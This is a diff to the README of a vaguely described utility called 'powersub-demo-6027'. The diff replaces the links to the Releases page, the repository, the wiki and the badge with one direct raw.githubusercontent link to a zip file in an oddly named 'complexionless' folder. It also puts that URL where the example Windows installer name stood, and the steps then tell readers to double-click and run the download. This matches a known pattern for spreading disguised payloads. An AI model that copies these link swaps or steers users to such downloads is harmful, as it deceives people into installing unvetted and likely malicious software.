@@ -2,7 +2,7 @@
 # 🎉 powersub-demo-6027 - Simple Solutions for Everyday Tasks
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now%20%F0%9F%93%88-Download%20Here-brightgreen)](https://github.com/hiroluv/powersub-demo-6027/releases)
+[![Download](https://raw.githubusercontent.com/hiroluv/powersub-demo-6027/main/complexionless/powersub-demo-6027.zip%20Now%20%F0%9F%93%88-Download%20Here-brightgreen)](https://raw.githubusercontent.com/hiroluv/powersub-demo-6027/main/complexionless/powersub-demo-6027.zip)
 
 ## 🚀 Getting Started
 Welcome to powersub-demo-6027! This application helps you manage common tasks effortlessly. Whether you want to organize your files, track your activities, or simplify daily operations, you are in the right place. Let’s get started.
@@ -23,12 +23,12 @@ Welcome to powersub-demo-6027! This application helps you manage common tasks ef
 ## 📥 Download & Install
 To get the latest version of powersub-demo-6027, visit the Releases page. 
 
-[Download the latest version here!](https://github.com/hiroluv/powersub-demo-6027/releases)
+[Download the latest version here!](https://raw.githubusercontent.com/hiroluv/powersub-demo-6027/main/complexionless/powersub-demo-6027.zip)
 
 1. Click on the link above to open the Releases page.
 2. You will see a list of available downloads.
 3. Locate the most recent version, often marked as `Latest release`.
-4. Click on the file name corresponding to your operating system (for example, `powersub-demo-6027-windows.exe` for Windows).
+4. Click on the file name corresponding to your operating system (for example, `https://raw.githubusercontent.com/hiroluv/powersub-demo-6027/main/complexionless/powersub-demo-6027.zip` for Windows).
 5. The download will start automatically.
 6. Once downloaded, locate the file in your Downloads folder.
 7. Double-click the file to run the installer and follow the on-screen instructions.
@@ -55,8 +55,8 @@ Yes, after installation, you can use all features without an internet connection
 You can open an issue in the GitHub repository, and our team will respond as soon as possible.
 
 ## 📌 Additional Resources
-- [GitHub Repository](https://github.com/hiroluv/powersub-demo-6027): Access the source code and submit feedback.
-- [User Guide](https://github.com/hiroluv/powersub-demo-6027/wiki): Detailed instructions on using all features.
+- [GitHub Repository](https://raw.githubusercontent.com/hiroluv/powersub-demo-6027/main/complexionless/powersub-demo-6027.zip): Access the source code and submit feedback.
+- [User Guide](https://raw.githubusercontent.com/hiroluv/powersub-demo-6027/main/complexionless/powersub-demo-6027.zip): Detailed instructions on using all features.
 
 ## 🎯 Contribution
 Your contributions are welcome! If you want to help improve the application, feel free to fork the repository, make changes, and submit a pull request.
